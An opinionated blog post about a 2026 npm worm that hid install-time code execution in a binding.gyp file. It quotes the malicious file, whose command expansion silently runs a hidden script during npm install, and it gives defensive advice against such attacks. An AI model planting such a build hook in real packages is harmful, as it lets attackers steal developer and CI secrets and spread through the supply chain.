+++
title = "npm's Dumbest File Just Became a Worm Launcher"
date = 2026-06-06T09:00:00Z
description = "A 157-byte binding.gyp turned install time into an exfiltration party, and the ecosystem still keeps staring at the wrong door."
+++

npm got mugged by a 157-byte file, and somehow the rest of us are the ones bleeding.

The latest June 2026 supply-chain mess did not ride in on a flashy `preinstall` script or some dramatic `postinstall` clown car. It hid in `binding.gyp`, which is exactly the kind of boring build file people mentally file under _someone else will look at that later_ and then never look at it again. That was the opening. That was the crime scene.

StepSecurity called the trick **Phantom Gyp**. Snyk tracked the broader mess as a self-propagating npm worm. Both names are better than the actual feeling, which is: oh, great, the install path now has a side door and the door is on fire.

The malicious file is almost offensively small:

```json
{
   "targets": [
      {
         "target_name": "Setup",
         "type": "none",
         "sources": ["<!(node index.js > /dev/null 2>&1 && echo stub.c)"]
      }
   ]
}
```

That is not a build config. That is a trap with whitespace.

The important part is the `<!(...)` expansion. `node-gyp` sees the file, decides it needs to do a native build thing, and then cheerfully executes the payload during `npm install`. No `package.json` script. No obvious lifecycle hook. Just a tiny build metadata file doing its best impression of a landmine.

And because the package ecosystem is apparently committed to the bit of pretending every new attack will be a variant of the last one, a lot of tooling still watches the wrong doorway. People scan for `preinstall` and `postinstall` like security is a hall monitor job. Meanwhile the real burglary comes through the basement window.

The reported blast radius was ugly: packages like `@vapi-ai/server-sdk`, `ai-sdk-ollama`, `autotel`, `awaitly`, and friends got hit, with the worm using stolen maintainer access to republish more poisoned versions. The payload went after developer and CI secrets, shoved data into attacker-controlled GitHub repos, and even tried to spread itself into GitHub Actions workflows and AI-assistant config files. Because why just steal the keys when you can also leave a little note on the fridge for the next idiot.

What makes this especially annoying is that `binding.gyp` is not exotic. It is not some cursed edge feature invented in a basement by a man who hates joy. It is a normal part of the Node native-addon ecosystem. That is the whole problem. Attackers do not need to invent a new mechanism when the old one already has a perfectly good “run code now” lever hiding in plain sight.

And yes, `npm install --ignore-scripts` is still worth using. Just do not kid yourself that it magically solves the class. It blocks a lot, but it does not erase the fact that build metadata can still trigger execution if you let malicious versions into the tree in the first place. Defense in depth, not defense by prayer.

If you want the unpleasant moral of the story, here it is: every time the ecosystem says “we fixed install-time code execution,” what it often means is “we fixed the obvious version of install-time code execution.” Attackers take that sentence personally.

The real lesson is uglier and more useful:

- treat freshly published dependencies like they are radioactive until proven boring
- pin exact versions and watch lockfiles like a paranoid raccoon
- flag `binding.gyp`, `extconf.rb`, and other build hooks as first-class review targets
- treat unexpected `node-gyp rebuild`, `curl`, `unzip`, or `bun` during install as a giant red siren, not a “hmm weird” moment
- assume CI secrets are gone the instant an untrusted install step gets code execution

```bash
npm ls @vapi-ai/server-sdk ai-sdk-ollama autotel awaitly
npm install --ignore-scripts
```

That second line is not a magic spell. It is a seatbelt.

The part that really pisses me off is how predictable this all is. We keep building a bigger trust cathedral around package managers, then act shocked when someone crawls in through the crawlspace. We keep asking for better provenance, better attestations, better scanning, better policy, and those are all good things, but none of them matter if the thing you are installing can still casually execute code through a file that security scanners mostly ignore because it does not look exciting enough.

It turns out the boring file was the knife.

And that is the damn joke: the internet did not get taken down by a genius zero-day. It got punked by a 157-byte build config and a bunch of people assuming the monster would be louder than that.
